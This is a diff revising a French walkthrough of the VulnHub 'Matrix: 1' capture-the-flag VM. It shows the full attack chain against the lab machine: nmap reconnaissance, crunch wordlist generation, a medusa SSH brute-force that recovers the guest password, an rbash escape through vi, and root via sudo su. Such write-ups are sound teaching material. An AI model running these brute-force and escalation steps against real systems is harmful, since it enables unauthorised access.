@@ -1,10 +1,10 @@
 # Matrix: 1
 
-[Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/) est une machine virtuelle vulnérable, conçue par [Ajay Verma](https://twitter.com/@unknowndevice64) au mois d'août 2018 et publiée sur VulnHub début novembre. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/) est une machine virtuelle vulnérable, conçue par [Ajay Verma](https://twitter.com/@unknowndevice64) au mois d'août 2018 et publiée sur VulnHub en novembre de la même année. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
 ## Recherche d'informations
 
-Pour commencer, l'outil netdiscover est utilisé afin de retrouver l'adresse IP de la VM Matrix : il s'agit de 192.168.56.101.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Matrix : il s'agit de 192.168.56.101.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -19,7 +19,7 @@ _____________________________________________________________________________
 192.168.56.101  08:00:27:e5:b2:aa      1      60  PCS Systemtechnik GmbH
 ```
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH (port 22) au serveur Matrix ; deux serveurs Web (Python / SimpleHTTPServer) sont par ailleurs installés, respectivement sur les ports 80 et 31337.
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH (port 22) au serveur Matrix ; deux serveurs Web (Python / SimpleHTTPServer) sont par ailleurs installés, respectivement sur les ports 80 et 31337.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.101
@@ -33,13 +33,13 @@ PORT      STATE SERVICE VERSION
 MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
 ```
 
-## Follow the white rabbit.
+## Chasse au trésor : base64 et Brainfuck
 
-C'est parti, la première page Web sur le port 80 s'intitule « Welcome in Matrix » et nous invite, comme dans le film éponyme, à descendre avec le lapin blanc au fond du gouffre. À noter la présence d'un compte à rebours avant la date du 17/10/2018 (zut, trop tard !) et de l'image d'un tout petit-petit-lapin en bas de page. Le nom de l'image, p0rt_31337.png, donne un indice précieux pour la suite du CTF ; au cas où notre scan nmap n'aurait pas été exhaustif. Inutile donc de s'attarder sur le port 80 à la recherche d'une éventuelle vulnérabilité Web, ou d'informations supplémentaires.
+C'est parti, la première page Web sur le port 80 s'intitule « _Welcome in Matrix_ » et nous invite, comme dans le film éponyme, à descendre avec le lapin blanc au fond du gouffre. À noter la présence d'un compte à rebours avant la date du 17/10/2018 (zut, trop tard !) et de l'image d'un tout petit-petit-lapin en bas de page. Le nom de l'image ```p0rt_31337.png``` donne un indice précieux pour la suite du CTF ; au cas où notre scan nmap n'aurait pas été exhaustif. Inutile donc de s'attarder sur le port 80 à la recherche d'une éventuelle vulnérabilité Web, ou d'informations supplémentaires.
 
-![Affichage de l'image INDEX-Matrix.PNG](INDEX-Matrix.PNG)
+![Affichage de l'image Matrix.png](Matrix.png)
 
-La deuxième page Web sur le port 31337 s'intitule elle aussi « Welcome in Matrix », mais diffère légèrement de la première. Outre la citation de Cypher, l'un des protagonistes du film, on remarque dans le code source un élément en base64 qui, une fois traduit, donne ```echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix``` en texte clair.
+La deuxième page Web sur le port 31337 s'intitule elle aussi « _Welcome in Matrix_ », mais diffère légèrement de la première. Outre la citation de Cypher, l'un des protagonistes du film, on remarque dans le code source un élément en base64 qui, une fois traduit, donne ```echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix``` en texte clair.
 
 ```html
 <!-- service -->
@@ -49,7 +49,7 @@ La deuxième page Web sur le port 31337 s'intitule elle aussi « Welcome in Matr
 </div><!-- End / service -->
 ```
 
-Encore une autre citation du film, et il semblerait qu'elle ait été stockée dans le fichier Cypher.matrix.
+Encore une autre citation du film, et il semblerait qu'elle ait été stockée dans le fichier ```Cypher.matrix```.
 
 ```console
 root@blinils:~# curl http://192.168.56.101:31337/Cypher.matrix
@@ -118,10 +118,13 @@ Il s'agit d'une portion de code en [Brainfuck](https://en.wikipedia.org/wiki/Bra
 ```console
 You can enter into matrix as guest, with password k1ll0rXX
 
-Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
+Note: Actually, I forget last two characters so I have replaced
+with XX try your luck and find correct string of password.
 ```
 
-Cela signifie qu'il va falloir tester un grand nombre de combinaisons, XX pouvant être des caractères majuscules, minuscules, spéciaux ou des chiffres. Pour cela, le générateur de wordlists [Crunch](https://tools.kali.org/password-attacks/crunch) est particulièrement adapté !
+## Génération de wordlists avec Crunch et attaque avec Medusa
+
+Cela signifie qu'il va falloir tester un grand nombre de combinaisons, XX pouvant être des caractères majuscules, minuscules, spéciaux ou des chiffres. Pour cela, le générateur de wordlists [__Crunch__](https://tools.kali.org/password-attacks/crunch) est particulièrement adapté !
 
 ```console
 root@blinils:~# crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -t k1ll0r@@ > login.db
@@ -133,7 +136,7 @@ Crunch will now generate the following amount of data: 81225 bytes
 Crunch will now generate the following number of lines: 9025
 ```
 
-Le charset choisi, mixalpha-numeric-all-space, correspond aux 95 caractères suivants : ```abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789 !@#$%^&*()- _+=~\`[]{}|:;"'<>,.?/``` espace typographique comprise, soit un total de 95 x 95 = 9025 combinaisons possibles. Plutôt que de toutes les tester à la main, l'outil [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html) va automatiser cette [attaque par dictionnaire](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf).
+Le charset choisi, ```mixalpha-numeric-all-space```, correspond aux 95 caractères suivants : ```abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789 !@#$%^&*()- _+=~\`[]{}|:;"'<>,.?/``` espace typographique comprise, soit un total de 95 x 95 = 9025 combinaisons possibles. Plutôt que de toutes les tester à la main, l'outil [__Medusa__](http://foofus.net/goons/jmk/medusa/medusa.html) va automatiser cette [attaque par dictionnaire](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf).
 
 ```console
 root@blinils:~# medusa -h 192.168.56.101 -u guest -P login.db -M ssh
@@ -148,7 +151,7 @@ ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rag (7 of 9025 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rah (8 of 9025 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rai (9 of 9025 complete)
---REDACTED--
+--snip--
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7k (5616 of 9025 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7l (5617 of 9025 complete)
 ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7m (5618 of 9025 complete)
@@ -156,7 +159,7 @@ ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of
 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: guest Password: k1ll0r7n [SUCCESS]
 ```
 
-Victoire ! Nous pouvons nous connecter au serveur avec les credentials guest/k1ll0r7n !
+Victoire ! Nous pouvons nous connecter au serveur avec les credentials ```guest:k1ll0r7n``` !
 
 ```console
 root@blinils:~# ssh guest@192.168.56.101
@@ -169,9 +172,9 @@ Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
 guest@porteus:~$ 
 ```
 
-## Welcome to the Real World.
+## Évasion d'un shell restreint et variable d'environnement PATH
 
-Manque de chance, il s'agit d'un [shell restreint](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (_restricted shell_). Contrairement aux shells habituels, plusieurs restrictions sont mises en place ; citons par exemple l'interdiction de changer de répertoire courant (cd), l'interdiction de modifier les variables d'environnement SHELL, PATH, ENV et BASH_ENV ou encore l'interdiction d'appeler des commandes contenant / la barre oblique.
+Manque de chance, il s'agit d'un [shell restreint](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (_restricted shell_). Contrairement aux shells habituels, plusieurs restrictions sont mises en place ; citons par exemple l'interdiction de changer de répertoire courant avec la commande ```cd```, l'interdiction de modifier les variables d'environnement ```SHELL```, ```PATH```, ```ENV``` et ```BASH_ENV``` ou encore l'interdiction d'appeler des commandes contenant ```/``` la barre oblique.
 
 ```console
 guest@porteus:~$ cd /etc
@@ -193,7 +196,7 @@ guest@porteus:~$ w; whoami; id; uname;
 -rbash: uname: command not found
 ```
 
-L'article _[Escaping Restricted Linux Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)_ posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que vi ou vim. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/bash``` nous permet d'obtenir un shell digne de ce nom !
+L'article [_Escaping Restricted Linux Shells_](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que ```vi``` ou ```vim```. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/bash``` nous permet d'obtenir un shell digne de ce nom !
 
 ```console
 guest@porteus:~$ vi
@@ -204,7 +207,8 @@ guest@porteus:~$ vi
 
 --snip--
 
-~                                                                                                   
+~
+
 bash: grep: command not found
 bash: ps: command not found
 bash: ps: command not found
@@ -227,7 +231,7 @@ lrwxrwxrwx  1 guest users   11 Aug  6 11:00 vi -> /usr/bin/vi*
 guest@porteus:~/prog$
 ```
 
-C'est quand même plus sympa pour poursuivre et finir ce CTF ! Peu d'alias ont été créés dans le fichier .bashrc et la variable d'environnement $PATH est quasi-vide ; il est nécessaire de spécifier à chaque fois le chemin absolu des binaires appelés.
+C'est quand même plus sympa pour poursuivre et finir ce CTF ! Peu d'alias ont été créés dans le fichier ```.bashrc``` et la variable d'environnement ```$PATH``` est quasi-vide ; il est nécessaire de spécifier à chaque fois le chemin absolu des binaires appelés.
 
 ```console
 guest@porteus:~$ echo $0
@@ -249,14 +253,18 @@ guest@porteus:~$ /usr/bin/uname -r
 4.16.3-porteus
 ```
 
-La solution de facilité consiste à ajouter les chemins qui vont bien à la variable d'environnement PATH.
+La solution de facilité consiste à ajouter les chemins qui vont bien à la variable d'environnement ```PATH```.
 
 ```console
 guest@porteus:~$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
 guest@porteus:~$ uname -r
 4.16.3-porteus
+```
 
+## Mauvaise gestion des privilèges d'administration via le fichier /etc/sudoers
+
+```console
 guest@porteus:~$ sudo -l
 User guest may run the following commands on porteus:
     (ALL) ALL
@@ -264,7 +272,7 @@ User guest may run the following commands on porteus:
     (trinity) NOPASSWD: /bin/cp
 ```
 
-Dommage, tout comme la [VM W1r3s](/CTF-VulnLabs/w1r3s), la fin de ce CTF est une formalité. L'utilisateur guest est autorisé à exécuter toutes les commandes via sudo, on peut alors passer root avec la commande ```sudo su``` et le tour est joué.
+Dommage, tout comme la [VM W1R3S: 1.0.1](/CTF-VulnLabs/w1r3s), la fin de ce CTF est une formalité. L'utilisateur guest est autorisé à exécuter toutes les commandes via sudo, on peut alors passer root avec la commande ```sudo su``` et le tour est joué.
 
 ```console
 guest@porteus:~$ /usr/bin/sudo su root
@@ -278,4 +286,4 @@ root@porteus:/home/guest# wc -c /root/flag.txt
 
 ## Conclusion
 
-La première partie de ce CTF ressemblait davantage à une chasse au trésor, et n'est pas représentative de ce qu'on pourrait trouver en pentest (encore que...), la diversité des challenges était néanmoins sympa. À moins de n'avoir sauté une étape, l'utilisateur _trinity_ n'entre en rien dans la résolution du CTF, ce qui est dommage ; une étape intermédiaire aurait été la bienvenue. Idem pour l'élévation de privilèges, le ```sudo su root``` est assez simple à trouver et à exploiter. Cela dit, la VM aux couleurs de Matrix et l'idée du _restricted shell_ étaient super chouettes. Merci beaucoup à [Ajay Verma](https://twitter.com/@unknowndevice64) pour la création de cette VM !
+La première partie de ce CTF ressemblait davantage à une chasse au trésor, et n'est pas représentative de ce qu'on pourrait trouver en pentest (encore que...), la diversité des challenges était néanmoins sympa. À moins de n'avoir sauté une étape, le compte utilisateur ```trinity``` n'entre en rien dans la résolution du CTF, ce qui est dommage ; une étape intermédiaire aurait été la bienvenue. Idem pour l'élévation de privilèges, le ```sudo su root``` est assez simple à trouver et à exploiter. Cela dit, la VM aux couleurs de Matrix et l'idée du _restricted shell_ étaient très chouettes. Merci beaucoup à [Ajay Verma](https://twitter.com/@unknowndevice64) pour la création de cette VM !
